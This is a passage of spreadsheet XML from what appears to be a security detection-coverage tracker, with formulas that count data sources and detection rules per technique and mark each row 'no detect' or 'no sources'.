        <f t="array" ref="H179">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I179" s="9" t="str" cm="1">
        <f t="array" ref="I179">IF(SUM(IF($C179=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C179=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J179" s="9" cm="1">
        <f t="array" ref="J17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179" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M179" s="9" cm="1">
        <f t="array" ref="M179">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N179" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O179" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P179" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S17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79" t="s">
        <v>368</v>
      </c>
      <c r="U179" t="s">
        <v>1093</v>
      </c>
      <c r="V179" t="s">
        <v>1094</v>
      </c>
      <c r="W179" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="180" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A180" t="s">
        <v>1092</v>
      </c>
      <c r="B180" t="s">
        <v>1095</v>
      </c>
      <c r="C180" t="s">
        <v>1096</v>
      </c>
      <c r="D180" t="s">
        <v>11</v>
      </c>
      <c r="E180" t="s">
        <v>940</v>
      </c>
      <c r="F180" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G180" s="9" cm="1">
        <f t="array" ref="G180">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H180" s="9" t="str" cm="1">
        <f t="array" ref="H180">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I180" s="9" t="str" cm="1">
        <f t="array" ref="I180">IF(SUM(IF($C180=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C180=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J180" s="9" t="str" cm="1">
        <f t="array" ref="J18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80" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M180" s="9" cm="1">
        <f t="array" ref="M180">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N180" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O180" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P180" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S18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80" t="s">
        <v>368</v>
      </c>
      <c r="U180" t="s">
        <v>1097</v>
      </c>
      <c r="V180" t="s">
        <v>1098</v>
      </c>
      <c r="W180" t="b">
        <v>1</v>
      </c>
      <c r="X180" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="181" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A181" t="s">
        <v>1092</v>
      </c>
      <c r="B181" t="s">
        <v>1099</v>
      </c>
      <c r="C181" t="s">
        <v>1100</v>
      </c>
      <c r="D181" t="s">
        <v>11</v>
      </c>
      <c r="E181" t="s">
        <v>1029</v>
      </c>
      <c r="F181" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G181" s="9" cm="1">
        <f t="array" ref="G181">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H181" s="9" t="str" cm="1">
        <f t="array" ref="H181">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I181" s="9" t="str" cm="1">
        <f t="array" ref="I181">IF(SUM(IF($C181=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C181=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J181" s="9" t="str" cm="1">
        <f t="array" ref="J18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81" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M181" s="9" cm="1">
        <f t="array" ref="M181">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N181" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O181" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P181" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S18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81" t="s">
        <v>368</v>
      </c>
      <c r="U181" t="s">
        <v>1101</v>
      </c>
      <c r="V181" t="s">
        <v>1094</v>
      </c>
      <c r="W181" t="b">
        <v>1</v>
      </c>
      <c r="X181" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="182" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A182" t="s">
        <v>1092</v>
      </c>
      <c r="B182" t="s">
        <v>1102</v>
      </c>
      <c r="C182" t="s">
        <v>1103</v>
      </c>
      <c r="D182" t="s">
        <v>11</v>
      </c>
      <c r="E182" t="s">
        <v>1029</v>
      </c>
      <c r="F182" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G182" s="9" cm="1">
        <f t="array" ref="G182">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H182" s="9" t="str" cm="1">
        <f t="array" ref="H182">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I182" s="9" t="str" cm="1">
        <f t="array" ref="I182">IF(SUM(IF($C182=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C182=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J182" s="9" t="str" cm="1">
        <f t="array" ref="J18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82" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M182" s="9" cm="1">
        <f t="array" ref="M182">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N182" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O182" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P182" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S18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82" t="s">
        <v>368</v>
      </c>
      <c r="U182" t="s">
        <v>1104</v>
      </c>
      <c r="V182" t="s">
        <v>1105</v>
      </c>
      <c r="W182" t="b">
        <v>1</v>
      </c>
      <c r="X182" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="183" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A183" t="s">
        <v>1106</v>
      </c>
      <c r="B183" t="s">
        <v>1106</v>
      </c>
      <c r="C183" t="s">
        <v>140</v>
      </c>
      <c r="D183" t="s">
        <v>11</v>
      </c>
      <c r="E183" t="s">
        <v>438</v>
      </c>
      <c r="F183" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G183" s="9" cm="1">
        <f t="array" ref="G183">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H183" s="9" cm="1">
        <f t="array" ref="H183">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I183" s="9" t="str" cm="1">
        <f t="array" ref="I183">IF(SUM(IF($C183=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C183=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J183" s="9" t="str" cm="1">
        <f t="array" ref="J18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83" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M183" s="9" cm="1">
        <f t="array" ref="M183">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N183" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O183" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P183" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S18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83" t="s">
        <v>368</v>
      </c>
      <c r="U183" t="s">
        <v>1107</v>
      </c>
      <c r="V183" t="s">
        <v>1108</v>
      </c>
      <c r="W183" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="184" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A184" t="s">
        <v>1109</v>
      </c>
      <c r="B184" t="s">
        <v>1109</v>
      </c>
      <c r="C184" t="s">
        <v>133</v>
      </c>
      <c r="D184" t="s">
        <v>11</v>
      </c>
      <c r="E184" t="s">
        <v>1110</v>
      </c>
      <c r="F184" s="9">
        <f t="shared" si="2"/>
        <v>5</v>
      </c>
      <c r="G184" s="9" cm="1">
        <f t="array" ref="G184">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H184" s="9" cm="1">
        <f t="array" ref="H184">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I184" s="9" t="str" cm="1">
        <f t="array" ref="I184">IF(SUM(IF($C184=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C184=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J184" s="9" t="str" cm="1">
        <f t="array" ref="J18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84" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M184" s="9" cm="1">
        <f t="array" ref="M184">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N184" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O184" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P184" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S18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84" t="s">
        <v>425</v>
      </c>
      <c r="U184" t="s">
        <v>1111</v>
      </c>
      <c r="V184" t="s">
        <v>1112</v>
      </c>
      <c r="W184" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="185" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A185" t="s">
        <v>1113</v>
      </c>
      <c r="B185" t="s">
        <v>1113</v>
      </c>
      <c r="C185" t="s">
        <v>92</v>
      </c>
      <c r="D185" t="s">
        <v>3</v>
      </c>
      <c r="E185" t="s">
        <v>797</v>
      </c>
      <c r="F185" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G185" s="9" cm="1">
        <f t="array" ref="G185">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H185" s="9" cm="1">
        <f t="array" ref="H185">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I185" s="9" t="str" cm="1">
        <f t="array" ref="I185">IF(SUM(IF($C185=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C185=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J185" s="9" t="str" cm="1">
        <f t="array" ref="J18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85" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M185" s="9" cm="1">
        <f t="array" ref="M185">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N185" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O185" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P185" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S18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85" t="s">
        <v>368</v>
      </c>
      <c r="U185" t="s">
        <v>1114</v>
      </c>
      <c r="V185" t="s">
        <v>1115</v>
      </c>
      <c r="W185" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="186" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A186" t="s">
        <v>1116</v>
      </c>
      <c r="B186" t="s">
        <v>1116</v>
      </c>
      <c r="C186" t="s">
        <v>32</v>
      </c>
      <c r="D186" t="s">
        <v>7</v>
      </c>
      <c r="E186" t="s">
        <v>1117</v>
      </c>
      <c r="F186" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G186" s="9" cm="1">
        <f t="array" ref="G186">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H186" s="9" cm="1">
        <f t="array" ref="H186">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I186" s="9" t="str" cm="1">
        <f t="array" ref="I186">IF(SUM(IF($C186=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C186=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J186" s="9" cm="1">
        <f t="array" ref="J18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186" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M186" s="9" cm="1">
        <f t="array" ref="M186">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N186" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O186" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P186" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S18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86" t="s">
        <v>979</v>
      </c>
      <c r="U186" t="s">
        <v>1118</v>
      </c>
      <c r="V186" t="s">
        <v>1119</v>
      </c>
      <c r="W186" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="187" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A187" t="s">
        <v>1116</v>
      </c>
      <c r="B187" t="s">
        <v>1120</v>
      </c>
      <c r="C187" t="s">
        <v>263</v>
      </c>
      <c r="D187" t="s">
        <v>7</v>
      </c>
      <c r="E187" t="s">
        <v>1121</v>
      </c>
      <c r="F187" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G187" s="9" cm="1">
        <f t="array" ref="G187">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H187" s="9" t="str" cm="1">
        <f t="array" ref="H187">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I187" s="9" t="str" cm="1">
        <f t="array" ref="I187">IF(SUM(IF($C187=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C187=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J187" s="9" t="str" cm="1">
        <f t="array" ref="J18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87" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M187" s="9" cm="1">
        <f t="array" ref="M187">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N187" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O187" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P187" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S18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87" t="s">
        <v>979</v>
      </c>
      <c r="U187" t="s">
        <v>1122</v>
      </c>
      <c r="V187" t="s">
        <v>1123</v>
      </c>
      <c r="W187" t="b">
        <v>1</v>
      </c>
      <c r="X187" t="s">
        <v>1116</v>
      </c>
    </row>
    <row r="188" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A188" t="s">
        <v>1116</v>
      </c>
      <c r="B188" t="s">
        <v>1124</v>
      </c>
      <c r="C188" t="s">
        <v>1125</v>
      </c>
      <c r="D188" t="s">
        <v>7</v>
      </c>
      <c r="E188" t="s">
        <v>1121</v>
      </c>
      <c r="F188" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G188" s="9" cm="1">
        <f t="array" ref="G188">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H188" s="9" t="str" cm="1">
        <f t="array" ref="H188">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I188" s="9" t="str" cm="1">
        <f t="array" ref="I188">IF(SUM(IF($C188=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C188=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J188" s="9" t="str" cm="1">
        <f t="array" ref="J18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88" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M188" s="9" cm="1">
        <f t="array" ref="M188">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N188" s="9">
